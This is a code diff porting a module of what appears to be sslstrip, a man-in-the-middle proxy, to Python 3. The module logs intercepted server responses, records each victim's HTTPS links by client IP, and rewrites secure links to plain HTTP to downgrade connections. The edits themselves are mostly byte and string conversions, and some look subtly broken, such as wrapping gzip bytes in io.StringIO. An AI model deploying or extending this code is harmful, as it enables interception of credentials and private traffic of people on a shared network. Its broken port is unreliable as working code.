@@ -16,7 +16,7 @@
 # USA
 #
 
-import logging, re, string, random, zlib, gzip, StringIO
+import logging, re, string, random, zlib, gzip, io
 
 from twisted.web.http import HTTPClient
 from URLMonitor import URLMonitor
@@ -121,20 +121,21 @@ class ServerConnection(HTTPClient):
     def handleResponse(self, data):
         if (self.isCompressed):
             logging.debug("Decompressing content...")
-            data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
+            data = gzip.GzipFile('', 'rb', 9, io.StringIO(data)).read()
             
-        logging.log(self.getLogLevel(), "Read from server:\n" + data)
+        logging.log(self.getLogLevel(), "Read from server:\n" + data.decode())
 
         data = self.replaceSecureLinks(data)
 
-        if (self.contentLength != None):
-            self.client.setHeader('Content-Length', len(data))
+        #if (self.contentLength != None):
+        self.contentLength = len(data)
+        self.client.setHeader('Content-Length', str(len(data)))
         
-        self.client.write(data)
+        self.client.write(data.encode())
         self.shutdown()
 
     def replaceSecureLinks(self, data):
-        iterator = re.finditer(ServerConnection.urlExpression, data)
+        iterator = re.finditer(ServerConnection.urlExpression, data.decode())
 
         for match in iterator:
             url = match.group()
@@ -145,7 +146,7 @@ class ServerConnection(HTTPClient):
             url = url.replace('&amp;', '&')
             self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
 
-        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
+        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data.decode())
         return re.sub(ServerConnection.urlType, 'http://', data)
 
     def shutdown(self):
